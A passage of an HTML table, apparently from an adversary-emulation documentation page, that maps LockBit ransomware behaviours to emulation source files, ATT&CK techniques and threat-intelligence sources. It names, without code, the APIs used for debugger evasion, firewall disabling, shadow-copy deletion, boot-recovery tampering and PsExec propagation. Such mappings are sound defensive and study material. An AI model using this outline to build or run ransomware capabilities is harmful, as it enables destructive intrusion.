0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit uses Windows API hashing for certain API calls</td>
<td><a href="../../resources/lockbit/src/common/util/winapihelper.cpp">winapihelper.cpp</a></td>
<td>T1027.007 Obfuscated Files or Information: Dynamic API Resolution</td>
<td><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit hides threads via NtSetInformationThread</td>
<td><a href="../../resources/lockbit/src/lockbit_main/def_evasion/hide_thread.cpp#L8-L36">HideThreadFromDebugger</a></td>
<td>T1622 Debugger Evasion</td>
<td><a href="https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html" class="outbound" target="_blank"><span>Trend Micro</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit discovers username via GetUserNameExW</td>
<td><a href="../../resources/lockbit/src/lockbit_main/discovery.cpp#L20-L50">GetUsername</a></td>
<td>T1033 System Owner/User Discovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit discovers domain via GetComputerNameExW</td>
<td><a href="../../resources/lockbit/src/lockbit_main/discovery.cpp#L81-L113">GetDomain</a></td>
<td>T1016 System Network Configuration Discovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit discovers hostname via GetComputerNameW</td>
<td><a href="../../resources/lockbit/src/lockbit_main/discovery.cpp#L52-L79">GetHostname</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit discovers OS architecture via GetNativeSystemInfo</td>
<td><a href="../../resources/lockbit/src/lockbit_main/discovery.cpp#L115-L148">GetOsArchitecture</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit discover OS version via RtlGetVersion</td>
<td><a href="../../resources/lockbit/src/lockbit_main/discovery.cpp#L150-L182">GetOsVersionString</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit creates and checks for a mutex</td>
<td><a href="../../resources/lockbit/src/lockbit_main/guardrails/mutex.cpp#L19-L63">CheckCreateMutex</a></td>
<td>T1480 Execution Guardrails</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit performs system language checks via NtQueryInstallUILanguage and NtQueryDefaultUILanguage</td>
<td><a href="../../resources/lockbit/src/lockbit_main/guardrails/lang.cpp#L36-L101">SystemHasExcludedLang</a></td>
<td>T1614.001 System Location Discovery: System Language Discovery</td>
<td><a href="https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit enumerates logical drives via GetLogicalDriveStringsW</td>
<td><a href="../../resources/lockbit/src/common/enumerate.cpp#L22-L65">GetLogicalDrives</a></td>
<td>T1083 File and Directory Discovery</td>
<td><a href="https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/lockbit-green-ransomware-conti-based-encryptor" class="outbound" target="_blank"><span>Sangfor</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit disables the firewall via RegCreateKeyExW and RegSetValueExW</td>
<td><a href="../../resources/lockbit/src/lockbit_main/def_evasion/disable_security.cpp#L8-L53">DisableFirewall</a></td>
<td>T1562.004 Impair Defenses: Disable or Modify System Firewall</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit executes WMI query &quot;SELECT * FROM Win32_ShadowCopy&quot; via CoInitializeEx, IWbemLocator::ConnectServer, and IWbemServices::ExecQuery</td>
<td><a href="../../resources/lockbit/src/lockbit_main/tamper/shadow.cpp#L12-L180">DeleteShadowCopies</a></td>
<td>T1047 Windows Management Instrumentation</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf" class="outbound" target="_blank"><span>Cybereason</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html" class="outbound" target="_blank"><span>Trend Micro</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit deletes shadow copies via IWbemServices::DeleteInstance</td>
<td><a href="../../resources/lockbit/src/lockbit_main/tamper/shadow.cpp#L182-L234">deleteDiscoveredShadowCopies</a></td>
<td>T1490 Inhibit System Recovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf" class="outbound" target="_blank"><span>Cybereason</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html" class="outbound" target="_blank"><span>Trend Micro</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit uses <code v-pre>bcdedit.exe</code> to disable automatic Windows recovery features</td>
<td><a href="../../resources/lockbit/src/lockbit_main/tamper/boot_recovery.cpp#L9-L65">DisableBootRecovery</a></td>
<td>T1490 Inhibit System Recovery</td>
<td><a href="https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom" class="outbound" target="_blank"><span>Cybereason</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockbit-targets-servers" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit discovers local IP networks via GetAdaptersInfo</td>
<td><a href="../../resources/lockbit/src/lockbit_main/propagate/local_ips.cpp#L57-L140">GetLocalIpv4AndCidr</a></td>
<td>T1016 System Network Configuration Discovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/" class="outbound" target="_blank"><span>The DFIR Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit discovers additional targets via IcmpSendEcho</td>
<td><a href="../../resources/lockbit/src/lockbit_main/propagate/ping.cpp#L10-L49">sendPing</a></td>
<td>T1018 Remote System Discovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/" class="outbound" target="_blank"><span>The DFIR Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit executes PsExec to propagate to additional targets</td>
<td><a href="../../resources/lockbit/src/lockbit_main/propagate/propagate.cpp#L161-L231">PerformPsExecPropagation</a></td>
<td>T1021.002 Remote Services: SMB/Windows Admin Shares</td>
